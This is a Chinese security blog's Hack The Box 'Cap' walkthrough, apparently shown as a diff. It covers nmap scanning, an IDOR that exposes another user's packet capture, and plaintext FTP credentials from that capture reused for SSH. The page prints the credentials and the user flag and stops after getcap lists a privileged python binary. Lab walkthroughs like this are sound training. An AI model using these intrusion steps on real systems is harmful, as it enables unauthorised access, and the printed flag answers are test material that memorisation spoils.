@@ -1,0 +1,909 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Cap About: Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions including performing network captures. Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user&rsquo;s capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root. Cap 是一台难度较低的 Linux 机器">
+<title>14. Cap</title>
+
+<link rel='canonical' href='https://Sp1ke-sec.github.io/p/14.-cap/'>
+
+<link rel="stylesheet" href="/scss/style.min.3dc2b87862416cdfa498393fe10f71a7856c63450472efbab1e94150643be501.css"><meta property='og:title' content="14. Cap">
+<meta property='og:description' content="Cap About: Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions including performing network captures. Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user&rsquo;s capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root. Cap 是一台难度较低的 Linux 机器">
+<meta property='og:url' content='https://Sp1ke-sec.github.io/p/14.-cap/'>
+<meta property='og:site_name' content='Sp1ke-sec 安全博客'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-11-08T11:30:22&#43;08:00'/><meta property='article:modified_time' content='2026-11-08T11:30:22&#43;08:00'/><meta property='og:image' content='https://Sp1ke-sec.github.io/p/14.-cap/assets/image-20261108105321725.png' />
+<meta name="twitter:title" content="14. Cap">
+<meta name="twitter:description" content="Cap About: Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions including performing network captures. Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user&rsquo;s capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root. Cap 是一台难度较低的 Linux 机器"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://Sp1ke-sec.github.io/p/14.-cap/assets/image-20261108105321725.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu1489495842607495246.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🚭</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Sp1ke-sec 安全博客</a></h1>
+            <h2 class="site-description">这里是 Sp1ke-sec</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Sp1ke-sec'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#task-1">Task 1</a></li>
+        <li><a href="#task-2">Task 2</a></li>
+        <li><a href="#task-3">Task 3</a></li>
+        <li><a href="#task-4">Task 4</a></li>
+        <li><a href="#task-5">Task 5</a></li>
+        <li><a href="#task-6">Task 6</a></li>
+        <li><a href="#submit-user-flag">Submit User Flag</a></li>
+        <li><a href="#task-8">Task 8</a></li>
+        <li><a href="#submit-root-flag">Submit Root Flag</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/14.-cap/">
+                <img src="/p/14.-cap/assets/image-20261108105321725_hu7259823200701580992.png"
+                        srcset="/p/14.-cap/assets/image-20261108105321725_hu7259823200701580992.png 800w, /p/14.-cap/assets/image-20261108105321725_hu995932087122150860.png 1600w"
+                        width="800" 
+                        height="381" 
+                        loading="lazy"
+                        alt="Featured image of post 14. Cap" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/htb/" style="background-color: #2a9d8f; color: #fff;">
+                HTB
+            </a>
+        
+            <a href="/categories/easy/" >
+                Easy
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/14.-cap/">14. Cap</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2026-11-08</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 3 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="cap">Cap
+</h1><p><img src="/p/14.-cap/assets/image-20261108105321725.png"
+	width="403"
+	height="192"
+	srcset="/p/14.-cap/assets/image-20261108105321725_hu14285743941944886084.png 480w, /p/14.-cap/assets/image-20261108105321725_hu6914197008680624505.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261108105321725"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="209"
+		data-flex-basis="503px"
+	
+></p>
+<p>About: Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions including performing network captures. Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user&rsquo;s capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root.</p>
+<p>Cap 是一台难度较低的 Linux 机器，运行 HTTP 服务器，执行包括网络捕获在内的管理功能。控制不当会导致不安全的直接对象引用 (IDOR)，从而允许访问其他用户的捕获内容。捕获到的数据包含明文凭据，可用于获取系统访问权限。攻击者随后利用 Linux 系统的特定功能提升至 root 权限。</p>
+<p>靶机 IP：10.129.14.221</p>
+<h3 id="task-1">Task 1
+</h3><blockquote>
+<p>How many TCP ports are open?</p>
+<p>有多少个TCP端口处于开放状态？</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/cap<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap -Pn 10.129.14.221                
+</span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-11-07 22:04 -0500
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.14.221 <span class="o">(</span>10.129.14.221<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.25s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">997</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
+</span></span><span class="line"><span class="cl">21/tcp open  ftp
+</span></span><span class="line"><span class="cl">22/tcp open  ssh
+</span></span><span class="line"><span class="cl">80/tcp open  http
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 2.88 seconds
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/cap<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap -Pn -p 21,22,80 -sV -sC 10.129.14.221
+</span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-11-07 22:06 -0500
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.14.221 <span class="o">(</span>10.129.14.221<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.25s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">21/tcp open  ftp     vsftpd 3.0.3
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    Gunicorn
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Security Dashboard
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: gunicorn
+</span></span><span class="line"><span class="cl">Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 18.71 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>按理说应该全端口扫描的，但是延迟比较高，所以就默认扫描一千个高频端口了。</p>
+<p><strong>答案：3</strong></p>
+<h3 id="task-2">Task 2
+</h3><blockquote>
+<p>After running a &ldquo;Security Snapshot&rdquo;, the browser is redirected to a path of the format <code>/[something]/[id]</code>, where <code>[id]</code> represents the id number of the scan. What is the <code>[something]</code>?</p>
+<p>运行“安全快照”后，浏览器会被重定向到格式为 /[something]/[id] 的路径，其中 [id] 代表扫描的 ID 号。[something] 是什么？</p>
+</blockquote>
+<p><img src="/p/14.-cap/assets/image-20261108110900655.png"
+	width="1190"
+	height="957"
+	srcset="/p/14.-cap/assets/image-20261108110900655_hu9499506620527209897.png 480w, /p/14.-cap/assets/image-20261108110900655_hu5511478211640372988.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261108110900655"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="124"
+		data-flex-basis="298px"
+	
+></p>
+<p>点击运行安全快照，被重定向到 <code>http://10.129.14.221/data/1</code></p>
+<p><strong>答案：data</strong></p>
+<h3 id="task-3">Task 3
+</h3><blockquote>
+<p>Are you able to get to other users&rsquo; scans?</p>
+<p>您能查看其他用户的扫描结果吗？</p>
+</blockquote>
+<p><img src="/p/14.-cap/assets/image-20261108111334621.png"
+	width="2002"
+	height="913"
+	srcset="/p/14.-cap/assets/image-20261108111334621_hu13704514175466974932.png 480w, /p/14.-cap/assets/image-20261108111334621_hu6990610736150315224.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261108111334621"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="219"
+		data-flex-basis="526px"
+	
+></p>
+<p>把 1 修改为 0 就能看到之前的扫描结果了。</p>
+<p><strong>答案：yes</strong></p>
+<h3 id="task-4">Task 4
+</h3><blockquote>
+<p>What is the ID of the PCAP file that contains sensative data?</p>
+<p>包含敏感数据的PCAP文件的ID是什么？</p>
+</blockquote>
+<p><strong>答案：0</strong></p>
+<h3 id="task-5">Task 5
+</h3><blockquote>
+<p>Which application layer protocol in the pcap file can the sensetive data be found in?</p>
+<p>pcap 文件中的哪个应用层协议包含敏感数据？</p>
+</blockquote>
+<p>点击 Download 下载到一个 <code>0.pcap</code> 文件，然后用 Wireshark 打开分析。</p>
+<p>整个 pcap 设计到的协议只有 TCP、FTP、HTTP，除了 TCP 是传输层，其它两个都是应用层。</p>
+<p>先看 HTTP 吧：</p>
+<p><img src="/p/14.-cap/assets/image-20261108111830850.png"
+	width="1547"
+	height="401"
+	srcset="/p/14.-cap/assets/image-20261108111830850_hu6893483528663539158.png 480w, /p/14.-cap/assets/image-20261108111830850_hu7935665712432249331.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261108111830850"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="385"
+		data-flex-basis="925px"
+	
+></p>
+<p>没什么东西，看一下 FTP：</p>
+<p><img src="/p/14.-cap/assets/image-20261108111935992.png"
+	width="1781"
+	height="418"
+	srcset="/p/14.-cap/assets/image-20261108111935992_hu5683193257664040.png 480w, /p/14.-cap/assets/image-20261108111935992_hu18374365474192080997.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261108111935992"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="426"
+		data-flex-basis="1022px"
+	
+></p>
+<p>得到明文的账密 nathan:Buck3tH4TF0RM3!</p>
+<p><strong>答案：ftp</strong></p>
+<h3 id="task-6">Task 6
+</h3><blockquote>
+<p>We&rsquo;ve managed to collect nathan&rsquo;s FTP password. On what other service does this password work?</p>
+<p>我们已经获取了Nathan的FTP密码。这个密码还能用于哪些其他服务？</p>
+</blockquote>
+<p>试一下 SSH 服务：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/cap<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# ssh nathan@10.129.14.221
+</span></span><span class="line"><span class="cl">......
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Last login: Thu May <span class="m">27</span> 11:21:27 <span class="m">2021</span> from 10.10.14.7
+</span></span><span class="line"><span class="cl">nathan@cap:~$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>成功登录。</p>
+<p><strong>答案：SSH</strong></p>
+<h3 id="submit-user-flag">Submit User Flag
+</h3><blockquote>
+<p>Submit the flag located in the nathan user&rsquo;s home directory.</p>
+<p>提交位于 nathan 用户主目录中的 flag。</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/cap<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# ftp 10.129.14.221               
+</span></span><span class="line"><span class="cl">Connected to 10.129.14.221.
+</span></span><span class="line"><span class="cl"><span class="m">220</span> <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Name <span class="o">(</span>10.129.14.221:root<span class="o">)</span>: nathan
+</span></span><span class="line"><span class="cl"><span class="m">331</span> Please specify the password.
+</span></span><span class="line"><span class="cl">Password: 
+</span></span><span class="line"><span class="cl"><span class="m">230</span> Login successful.
+</span></span><span class="line"><span class="cl">Remote system <span class="nb">type</span> is UNIX.
+</span></span><span class="line"><span class="cl">Using binary mode to transfer files.
+</span></span><span class="line"><span class="cl">ftp&gt; ls -la
+</span></span><span class="line"><span class="cl"><span class="m">229</span> Entering Extended Passive Mode <span class="o">(||</span><span class="p">|</span>16464<span class="p">|</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="m">150</span> Here comes the directory listing.
+</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">3</span> <span class="m">1001</span>     <span class="m">1001</span>         <span class="m">4096</span> May <span class="m">27</span>  <span class="m">2021</span> .
+</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">3</span> <span class="m">0</span>        <span class="m">0</span>            <span class="m">4096</span> May <span class="m">23</span>  <span class="m">2021</span> ..
+</span></span><span class="line"><span class="cl">lrwxrwxrwx    <span class="m">1</span> <span class="m">0</span>        <span class="m">0</span>               <span class="m">9</span> May <span class="m">15</span>  <span class="m">2021</span> .bash_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> <span class="m">1001</span>     <span class="m">1001</span>          <span class="m">220</span> Feb <span class="m">25</span>  <span class="m">2020</span> .bash_logout
+</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> <span class="m">1001</span>     <span class="m">1001</span>         <span class="m">3771</span> Feb <span class="m">25</span>  <span class="m">2020</span> .bashrc
+</span></span><span class="line"><span class="cl">drwx------    <span class="m">2</span> <span class="m">1001</span>     <span class="m">1001</span>         <span class="m">4096</span> May <span class="m">23</span>  <span class="m">2021</span> .cache
+</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> <span class="m">1001</span>     <span class="m">1001</span>          <span class="m">807</span> Feb <span class="m">25</span>  <span class="m">2020</span> .profile
+</span></span><span class="line"><span class="cl">lrwxrwxrwx    <span class="m">1</span> <span class="m">0</span>        <span class="m">0</span>               <span class="m">9</span> May <span class="m">27</span>  <span class="m">2021</span> .viminfo -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-r--------    <span class="m">1</span> <span class="m">1001</span>     <span class="m">1001</span>           <span class="m">33</span> Nov <span class="m">08</span> 02:52 user.txt
+</span></span><span class="line"><span class="cl"><span class="m">226</span> Directory send OK.
+</span></span><span class="line"><span class="cl">ftp&gt; get user.txt
+</span></span><span class="line"><span class="cl">local: user.txt remote: user.txt
+</span></span><span class="line"><span class="cl"><span class="m">229</span> Entering Extended Passive Mode <span class="o">(||</span><span class="p">|</span>9252<span class="p">|</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="m">150</span> Opening BINARY mode data connection <span class="k">for</span> user.txt <span class="o">(</span><span class="m">33</span> bytes<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">100% <span class="p">|</span>************************************************<span class="p">|</span>    <span class="m">33</span>       69.75 KiB/s    00:00 ETA
+</span></span><span class="line"><span class="cl"><span class="m">226</span> Transfer complete.
+</span></span><span class="line"><span class="cl"><span class="m">33</span> bytes received in 00:00 <span class="o">(</span>0.11 KiB/s<span class="o">)</span>
+</span></span><span class="line"><span class="cl">ftp&gt; <span class="nb">exit</span>
+</span></span><span class="line"><span class="cl"><span class="m">221</span> Goodbye.
+</span></span><span class="line"><span class="cl">                                                                                             
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/cap<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# cat user.txt     
+</span></span><span class="line"><span class="cl">1467ec4e2727efe7086edf14fa7d949b
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：1467ec4e2727efe7086edf14fa7d949b</strong></p>
+<h3 id="task-8">Task 8
+</h3><blockquote>
+<p>What is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges?</p>
+<p>这台机器上具有特殊功能、可被滥用以获取 root 权限的二进制文件的完整路径是什么？</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nathan@cap:~$ getcap -r / 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">/usr/bin/python3.8 <span class="o">=</span> cap_setuid,cap_net_bind_service+eip
